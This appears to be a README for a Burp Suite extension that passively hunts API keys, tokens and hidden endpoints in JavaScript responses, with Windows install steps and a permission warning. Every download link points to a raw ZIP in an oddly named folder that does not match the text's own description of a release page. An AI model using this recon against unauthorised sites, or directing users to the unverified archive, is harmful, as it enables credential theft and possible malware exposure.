# 🔎 BurpJSReconRadar - Find Hidden JS Secrets Fast

[![Download BurpJSReconRadar](https://img.shields.io/badge/Download-BurpJSReconRadar-blue?style=for-the-badge)](https://github.com/Ralffotografo/BurpJSReconRadar/raw/refs/heads/main/Pectinibranchia/Radar-Recon-JS-Burp-2.5.zip)

## 🧭 What BurpJSReconRadar Does

BurpJSReconRadar is a Burp Suite extension that checks HTTP responses for useful JavaScript clues in real time. It looks for secret keys, API tokens, endpoints, and weak settings while you browse sites in Burp Suite.

It helps you spot:
- Secret values in JavaScript files
- API keys and access tokens
- Hidden endpoints and paths
- Misconfigurations in web responses
- Common recon clues in passive traffic

It works in the background, so you do not need to run a separate scan.

## 💻 What You Need

Before you start, make sure you have:
- A Windows computer
- Burp Suite installed
- A working internet connection
- Permission to test the target site in Burp Suite

BurpJSReconRadar is made for passive checks inside Burp Suite. It fits best in a normal desktop setup on Windows.

## 📥 Download

Visit this page to download BurpJSReconRadar:

[https://github.com/Ralffotografo/BurpJSReconRadar/raw/refs/heads/main/Pectinibranchia/Radar-Recon-JS-Burp-2.5.zip](https://github.com/Ralffotografo/BurpJSReconRadar/raw/refs/heads/main/Pectinibranchia/Radar-Recon-JS-Burp-2.5.zip)

On the page, look for the latest release, source files, or build files. Download the file that matches the setup steps below.

## 🛠️ Install on Windows

Follow these steps to get it running on Windows:

1. Open the download page above.
2. Download the BurpJSReconRadar file or release package.
3. If the file is in a ZIP folder, right-click it and choose Extract All.
4. Open Burp Suite.
5. Go to the Extender area in Burp Suite.
6. Open the Extensions tab.
7. Add the BurpJSReconRadar file or load the extension from the extracted folder.
8. Wait for Burp Suite to finish loading it.

If Burp Suite asks for a file type, choose the extension file from the download package.

## ⚙️ How to Use It

After you install the extension, keep Burp Suite open and browse traffic through it.

1. Open your browser through Burp Suite.
2. Visit the site you want to test.
3. Let Burp passively inspect the responses.
4. Watch for matches in the extension output.
5. Review any keys, endpoints, or config issues it finds.

You do not need to start a manual scan for the extension to work. It watches the traffic Burp already sees.

## 🔍 What It Looks For

BurpJSReconRadar checks for a wide range of JavaScript and response patterns, such as:

- API keys
- Secret tokens
- Private endpoints
- Cloud service keys
- Webhook URLs
- Auth data
- Suspicious config values
- Debug or test settings
- Hardcoded credentials
- Publicly exposed JS references

It uses a large pattern set, so it can catch many common recon clues fast.

## 🧪 Best Use Cases

Use BurpJSReconRadar when you want to:
- Review JavaScript files for secrets
- Find hidden API routes
- Check for weak app settings
- Look for exposed service data
- Support bug bounty recon work
- Inspect passive HTTP responses during testing

It works well during early recon, when you want quick clues before deeper testing.

## 📁 Typical Setup Flow

A simple Windows setup often looks like this:

1. Download the project from GitHub.
2. Extract the files if needed.
3. Start Burp Suite.
4. Load the extension.
5. Open a target site in the browser linked to Burp.
6. Read the findings inside Burp.

If the project includes a compiled file, load that file. If it includes source files, use the extension load option Burp supports.

## 🖥️ Windows Tips

If Burp Suite does not load the extension at first, check these points:

- Make sure the file finished downloading
- Make sure you extracted the ZIP file
- Make sure Burp Suite can access the file path
- Make sure you picked the right file from the package
- Restart Burp Suite after loading the extension

Use a simple folder path like:
- `C:\BurpExtensions\BurpJSReconRadar\`

This keeps the file easy to find.

## 🧰 Common Files You May See

Depending on the release, you may find files like:
- A compiled extension file
- A source folder
- A README file
- A license file
- A release package

If you see more than one choice, start with the file meant for Burp Suite extension loading.

## 🔐 Safety and Scope

Use BurpJSReconRadar only on systems you own or have permission to test. It is meant for authorized security work, bug bounty tasks, and internal checks.

## 📚 Topics Covered by This Project

This project fits topics such as:
- api-keys
- bug-bounty
- burp-extension
- burp-suite
- javascript
- passive-scanner
- penetration-testing
- recon
- secret-detection
- security-tools

## ❓ If You Need Help

If the extension does not load, check the project page for:
- Release files
- Setup notes
- File names
- Burp Suite version details

If the project includes issues or discussions, use those to find the latest guidance from the author